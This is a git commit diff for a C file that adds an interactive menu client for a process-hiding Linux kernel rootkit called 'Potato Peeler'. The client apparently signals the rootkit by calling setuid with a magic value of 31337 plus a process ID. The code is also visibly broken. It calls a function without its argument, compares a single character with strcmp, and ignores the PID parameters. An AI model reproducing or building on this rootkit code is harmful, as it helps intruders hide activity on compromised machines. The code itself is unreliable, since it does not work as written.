b4c531c47033d5affd4b5b5fd1c713711d22918d
vfreak <vancejones53@gmail.com>
2017-05-20 15:30:31 -0700

    Working on using interaction

--- french_fries.c
+++ french_fries.c
@@ -5,30 +5,21 @@
 
 void HidePID(int PID){
 	int process_id;
-	 
+	scanf("%d", &process_id);
+	setuid(31337 + process_id);
 }
 
 void ShowPID(int PID){
 	int process_id;
-
+	scanf("%d", &process_id);
+        setuid(31337 + process_id);
 }
 
-int main(int argc, char *argv[]){
-	if(argc != 3){
-		printf("Uages: ./FrenchFry show/hide <PID>");
-		return 0;
-	}
-	else{
-		if(strcmp("hide", argv[1]) == 0){
-			HidePID(argv[2]);
-		}
-		if(strcmp("show", argv[1]) == 0){
-			ShowPID(argv[2]);
-		}
-		else{
-			printf("Unknown command, correct usage show/hide.")
-			return 0;
-		}
+int main(){
+	printf("--- Potato Peeler ---\n--- A LKM Rootkit ---\n(1) Hide Process\n(2) Exit");
+	char choice = getchar();
+	if(strcmp(choice, "1") == 0){
+		HidePID();
 	}
 	return 0;
 }
